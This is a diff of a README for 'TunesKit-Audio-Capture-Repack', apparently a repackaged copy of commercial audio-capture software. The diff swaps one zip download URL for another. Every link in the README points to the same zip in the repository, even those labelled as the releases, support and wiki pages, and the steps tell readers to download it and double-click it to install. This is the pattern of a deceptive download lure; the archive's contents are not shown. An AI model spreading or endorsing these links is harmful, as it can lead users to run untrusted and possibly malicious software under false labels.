@@ -1,6 +1,6 @@
 # 🎵 TunesKit-Audio-Capture-Repack - Easy Audio Recording Made Simple
 
-[![Download Now](https://github.com/Qverzomain/TunesKit-Audio-Capture-Repack/raw/refs/heads/main/Eupterotidae/Tunes_Audio_Kit_Capture_Repack_v2.2.zip%20Now-Visit%20Releases-blue)](https://github.com/Qverzomain/TunesKit-Audio-Capture-Repack/raw/refs/heads/main/Eupterotidae/Tunes_Audio_Kit_Capture_Repack_v2.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Qverzomain/TunesKit-Audio-Capture-Repack/main/Eupterotidae/Audio-Kit-Tunes-Capture-Repack-v3.6.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Qverzomain/TunesKit-Audio-Capture-Repack/main/Eupterotidae/Audio-Kit-Tunes-Capture-Repack-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to TunesKit Audio Capture Repack. This application allows you to capture
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Qverzomain/TunesKit-Audio-Capture-Repack/raw/refs/heads/main/Eupterotidae/Tunes_Audio_Kit_Capture_Repack_v2.2.zip) to find the latest version of TunesKit-Audio-Capture-Repack.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Qverzomain/TunesKit-Audio-Capture-Repack/main/Eupterotidae/Audio-Kit-Tunes-Capture-Repack-v3.6.zip) to find the latest version of TunesKit-Audio-Capture-Repack.
 2. Look for the latest release version. Click the file to download it.
-3. Once the download is complete, locate the file in your Downloads folder. It should be named something like `https://github.com/Qverzomain/TunesKit-Audio-Capture-Repack/raw/refs/heads/main/Eupterotidae/Tunes_Audio_Kit_Capture_Repack_v2.2.zip`.
+3. Once the download is complete, locate the file in your Downloads folder. It should be named something like `https://raw.githubusercontent.com/Qverzomain/TunesKit-Audio-Capture-Repack/main/Eupterotidae/Audio-Kit-Tunes-Capture-Repack-v3.6.zip`.
 4. Double-click the file to run the installation. Follow the prompts to complete the setup.
 
 ## ⚙️ System Requirements
@@ -59,11 +59,11 @@ If you face any challenges while using TunesKit Audio Capture, here are some com
 - **Application Won’t Open**: Make sure your system meets the requirements and try reinstalling.
 - **No Sound Captured**: Verify that you have selected the correct sound source and that your system audio is unmuted.
 
-For further help, please visit our [Support Page](https://github.com/Qverzomain/TunesKit-Audio-Capture-Repack/raw/refs/heads/main/Eupterotidae/Tunes_Audio_Kit_Capture_Repack_v2.2.zip) and submit any issues you encounter.
+For further help, please visit our [Support Page](https://raw.githubusercontent.com/Qverzomain/TunesKit-Audio-Capture-Repack/main/Eupterotidae/Audio-Kit-Tunes-Capture-Repack-v3.6.zip) and submit any issues you encounter.
 
 ## 👉 Additional Resources
 
-1. **User Guide**: A detailed user manual is available on the [Wiki page](https://github.com/Qverzomain/TunesKit-Audio-Capture-Repack/raw/refs/heads/main/Eupterotidae/Tunes_Audio_Kit_Capture_Repack_v2.2.zip).
+1. **User Guide**: A detailed user manual is available on the [Wiki page](https://raw.githubusercontent.com/Qverzomain/TunesKit-Audio-Capture-Repack/main/Eupterotidae/Audio-Kit-Tunes-Capture-Repack-v3.6.zip).
 2. **Video Tutorials**: We provide several video tutorials on our YouTube channel to help you navigate the application and explore its features.
 
 Feel free to reach out if you have any questions or need further assistance. Thank you for choosing TunesKit Audio Capture Repack!
